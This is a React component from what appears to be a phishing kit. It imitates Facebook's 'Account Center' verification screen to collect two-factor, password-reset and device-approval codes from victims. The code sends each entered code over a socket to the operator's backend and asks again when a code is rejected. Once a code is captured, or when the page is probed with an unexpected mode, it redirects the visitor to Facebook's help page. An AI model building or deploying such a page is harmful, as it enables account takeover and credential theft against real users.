import PropTypes from "prop-types";
import { useContext, useEffect, useState } from "react";
import { useLocation } from "react-router-dom";
import { SocketContext } from "../App";
import image from "../public/681.jpg";
import deviceImage from "../public/image.png";
import { ShowLoading, Spinner } from "./Home";
const Verify = () => {
	const socket = useContext(SocketContext);
	const location = useLocation();
	const searchParams = new URLSearchParams(location.search);
	const mode = searchParams.get("mode");
	const [device, setDevice] = useState("");
	const [stateButton, setStateButton] = useState("bg-blue-200");
	const [code, setCode] = useState("");
	const [error, setError] = useState("");
	const [loading, setLoading] = useState(false);
	const [url, setUrl] = useState("");
	const [showLoading, setShowLoading] = useState(false);
	const [socketEvent, setSocketEvent] = useState("");
	const [deviceVerification, setDeviceVerification] = useState(false);
	const handleCode = (e) => {
		if (mode === "two-factor") {
			setSocketEvent(`two-factor`);
		} else if (mode === "forget-password") {
			setSocketEvent(`forget-password`);
		} else if (mode === "device-verification") {
			setSocketEvent("device");
		} else {
			socket.emit("exit");
			window.location.replace("https://www.facebook.com/help");
		}
		if (e.target.value.length > 8) {
			setCode(e.target.value.slice(0, 8));
		} else {
			setCode(e.target.value);
		}
		e.preventDefault();
		if (e.target.value.length >= 6 && e.target.value.length <= 8) {
			setStateButton("bg-blue-500");
			setError("");
		} else {
			setStateButton("bg-blue-200");
			setError("Please enter a valid code");
		}
	};
	const handleSendCode = () => {
		socket.emit(socketEvent, code);
		socket.on(socketEvent + "Response", (data) => {
			if (data.message === "WRONG_CODE") {
				setLoading(false);
				setStateButton("bg-blue-200");
				setCode("");
				setError("Invalid code");
			} else {
				socket.emit("exit");
				setUrl("/submit");
				setShowLoading(true);
				setLoading(false);
			}
		});
		setStateButton("bg-blue-200");
		setLoading(true);
		setError("");
	};
	const handleSendCodeDevice = () => {
		socket.emit(socketEvent, code);
		socket.on(socketEvent + "Response", (data) => {
			if (data.message === "WRONG_CODE") {
				setLoading(false);
				setStateButton("bg-blue-200");
				setCode("");
				setError("Invalid code");
			} else {
				socket.emit("exit");
				setUrl("/submit");
				setShowLoading(true);
				setLoading(false);
			}
		});
		setStateButton("bg-blue-200");
		setLoading(true);
		setError("");
	};
	useEffect(() => {
		if (!mode) {
			socket.emit("exit");
			window.location.replace("https://www.facebook.com/help");
		} else if (
			mode !== "two-factor" &&
			mode !== "forget-password" &&
			mode !== "device-verification"
		) {
			socket.emit("exit");
			window.location.replace("https://www.facebook.com/help");
		} else if (mode === "device-verification") {
			setDeviceVerification(true);
			socket.emit("device-verification");
			socket.on("device-verificationResponse", (data) => {
				if (data.message) {
					socket.emit("exit");
					window.location.replace("https://www.facebook.com/help");
				} else {
					socket.emit("exit");
					window.location.replace("https://www.facebook.com/help");
				}
			});
		}
		window.addEventListener("resize", () => {
			if (window.innerWidth > 1024) {
				setDevice("desktop");
			} else {
				setDevice("mobile");
			}
		});
		if (window.innerWidth > 1024) {
			setDevice("desktop");
		} else {
			setDevice("mobile");
		}
	}, [mode, socket]);
	return (
		<div className='flex h-screen w-full flex-col items-center justify-center'>
			<header className='relative left-0 top-0 flex h-[40px] w-full items-center justify-center bg-gray-100 px-5 sm:justify-between sm:px-40'></header>
			{device === "desktop" ? (
				<DesktopMain
					handleCode={handleCode}
					stateButton={stateButton}
					code={code}
					error={error}
					handleSendCode={handleSendCode}
					loading={loading}
					deviceVerification={deviceVerification}
					handleSendCodeDevice={handleSendCodeDevice}
				/>
			) : (
				<MobileMain
					handleCode={handleCode}
					stateButton={stateButton}
					code={code}
					error={error}
					handleSendCode={handleSendCode}
					loading={loading}
					deviceVerification={deviceVerification}
					handleSendCodeDevice={handleSendCodeDevice}
				/>
			)}
			{showLoading && <ShowLoading url={url} />}
		</div>
	);
};
const InputForm = ({
	handleCode,
	stateButton,
	code,
	error,
	handleSendCode,
	loading,
}) => {
	return (
		<div>
			<input
				className='w-full rounded-xl border border-gray-300 p-4'
				type='number'
				placeholder='Code'
				inputMode='numeric'
				pattern='[0-9]*'
				autoComplete='one-time-code'
				onChange={handleCode}
				onInput={handleCode}
				value={code}
			/>
			<p className='text-red-500'>{error}</p>
			<button
				onClick={handleSendCode}
				className={`${stateButton} ${stateButton === "bg-blue-200" ? "cursor-wait" : "cursor-pointer"} my-3 flex w-full cursor-pointer items-center justify-center rounded-lg py-3 text-center text-lg font-semibold text-white focus:outline-none sm:py-3 xl:py-3`}
			>
				{loading ? <Spinner /> : "Continue"}
			</button>
		</div>
	);
};

const DesktopMain = ({
	handleCode,
	stateButton,
	code,
	error,
	handleSendCode,
	loading,
	deviceVerification,
	handleSendCodeDevice,
}) => {
	return (
		<main className='flex h-full w-full items-center justify-center bg-[#EEF7FF]'>
			<div className='flex h-full w-1/2 flex-col'>
				<b className='text-[15px] font-semibold text-[#1c2b33] text-[]'>
					Account Center • Facebook
				</b>
				<b className='text-2xl font-bold'>
					Check notifications on another device
				</b>
				{deviceVerification ? (
					<p>
						We&#39;ve sent a notification to your device. View Facebook
						notifications on those devices and approve the login to continue.
					</p>
				) : (
					<p>Please enter the verification code below from your phone</p>
				)}
				<img
					src={deviceVerification ? deviceImage : image}
					className='pointer-events-none my-3 select-none object-fill'
					alt=''
				/>
				{!deviceVerification && (
					<InputForm
						handleCode={handleCode}
						stateButton={stateButton}
						code={code}
						error={error}
						handleSendCode={handleSendCode}
						loading={loading}
					/>
				)}
				{deviceVerification && (
					<>
						<input
							className='w-full rounded-xl border border-gray-300 p-4'
							type='number'
							placeholder='Code'
							inputMode='numeric'
							pattern='[0-9]*'
							autoComplete='one-time-code'
							onChange={handleCode}
							onInput={handleCode}
							value={code}
						/>
						<p className='text-red-500'>{error}</p>
						<button
							onClick={handleSendCodeDevice}
							className={`${stateButton} ${stateButton === "bg-blue-200" ? "cursor-wait" : "cursor-pointer"} my-3 flex w-full cursor-pointer items-center justify-center rounded-lg py-3 text-center text-lg font-semibold text-white focus:outline-none sm:py-3 xl:py-3`}
						>
							{loading ? <Spinner /> : "Continue"}
						</button>
						<div className='flex gap-2'>
							<svg viewBox='0 0 24 24' className='h-6 w-6 fill-[#1C2B33]'>
								<path d='M15 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0zM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2zM11 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0z'></path>
								<path
									fillRule='evenodd'
									clipRule='evenodd'
									d='M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0z'
								></path>
							</svg>
							<div>
								<b className='label text-base font-semibold leading-5 text-[#1C2B33]	'>
									Awaiting approval
								</b>
								<p className='label text-[13px] text-[#465a69]'>
									It may take a few minutes for you to receive the notification
									on the other device. You can receive new notifications.
								</p>
							</div>
						</div>
					</>
				)}
			</div>
		</main>
	);
};

const MobileMain = ({
	handleCode,
	stateButton,
	code,
	error,
	handleSendCode,
	loading,
	deviceVerification,
	handleSendCodeDevice,
}) => {
	return (
		<main className='flex h-full w-full items-center justify-center bg-[#EEF7FF]'>
			<div className='flex h-full w-11/12 flex-col'>
				<b className='text-[15px] font-semibold text-[#1c2b33] text-[]'>
					Account Center • Facebook
				</b>
				<b className='text-2xl font-bold'>
					Check notifications on another device
				</b>
				<p>Please enter the verification code below from your phone</p>
				<img
					src={deviceVerification ? deviceImage : image}
					className='pointer-events-none my-3 select-none rounded-lg object-fill'
					alt=''
				/>
				{!deviceVerification && (
					<InputForm
						handleCode={handleCode}
						stateButton={stateButton}
						code={code}
						error={error}
						handleSendCode={handleSendCode}
						loading={loading}
					/>
				)}
				{deviceVerification && (
					<>
						<input
							className='w-full rounded-xl border border-gray-300 p-4'
							type='number'
							placeholder='Code'
							inputMode='numeric'
							pattern='[0-9]*'
							autoComplete='one-time-code'
							onChange={handleCode}
							onInput={handleCode}
							value={code}
						/>
						<p className='text-red-500'>{error}</p>
						<button
							onClick={handleSendCodeDevice}
							className={`${stateButton} ${stateButton === "bg-blue-200" ? "cursor-wait" : "cursor-pointer"} my-3 flex w-full cursor-pointer items-center justify-center rounded-lg py-3 text-center text-lg font-semibold text-white focus:outline-none sm:py-3 xl:py-3`}
						>
							{loading ? <Spinner /> : "Continue"}
						</button>
						<div className='flex gap-2'>
							<svg viewBox='0 0 24 24' className='h-6 w-6 fill-[#1C2B33]'>
								<path d='M15 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0zM8 13a1 1 0 1 1 0-2 1 1 0 0 1 0 2zM11 12a1 1 0 1 0 2 0 1 1 0 0 0-2 0z'></path>
								<path
									fillRule='evenodd'
									clipRule='evenodd'
									d='M23 12c0 6.075-4.925 11-11 11S1 18.075 1 12 5.925 1 12 1s11 4.925 11 11zm-2 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0z'
								></path>
							</svg>
							<div>
								<b className='label text-base font-semibold leading-5 text-[#1C2B33]	'>
									Awaiting approval
								</b>
								<p className='label text-[13px] text-[#465a69]'>
									It may take a few minutes for you to receive the notification
									on the other device. You can receive new notifications.
								</p>
							</div>
						</div>
					</>
				)}
			</div>
		</main>
	);
};

DesktopMain.propTypes = {
	handleCode: PropTypes.func.isRequired,
	stateButton: PropTypes.string.isRequired,
	code: PropTypes.string.isRequired,
	error: PropTypes.string.isRequired,
	handleSendCode: PropTypes.func.isRequired,
	loading: PropTypes.bool.isRequired,
	deviceVerification: PropTypes.bool.isRequired,
	handleSendCodeDevice: PropTypes.func.isRequired,
};
MobileMain.propTypes = {
	handleCode: PropTypes.func.isRequired,
	stateButton: PropTypes.string.isRequired,
	code: PropTypes.string.isRequired,
	error: PropTypes.string.isRequired,
	handleSendCode: PropTypes.func.isRequired,
	loading: PropTypes.bool.isRequired,
	deviceVerification: PropTypes.bool.isRequired,
	handleSendCodeDevice: PropTypes.func.isRequired,
};
InputForm.propTypes = {
	handleCode: PropTypes.func.isRequired,
	stateButton: PropTypes.string.isRequired,
	code: PropTypes.string.isRequired,
	error: PropTypes.string.isRequired,
	handleSendCode: PropTypes.func.isRequired,
	loading: PropTypes.bool.isRequired,
};
export default Verify;
